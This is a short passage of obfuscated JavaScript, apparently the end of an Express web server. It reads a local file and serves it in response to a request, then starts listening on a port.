_0x394981=path[_0x27060d(0x13c)](__dirname,_0x27060d(0x108)),_0x493c95=await fs[_0x27060d(0x130)][_0x27060d(0xe4)](_0x394981,'utf8');_0x1b41cb['send'](_0x493c95);}catch(_0x425b60){_0x1b41cb['send'](_0x27060d(0x12c));}}),app[_0x459461(0xeb)](PORT,()=>console['log'](_0x459461(0xed)+PORT+'!'));
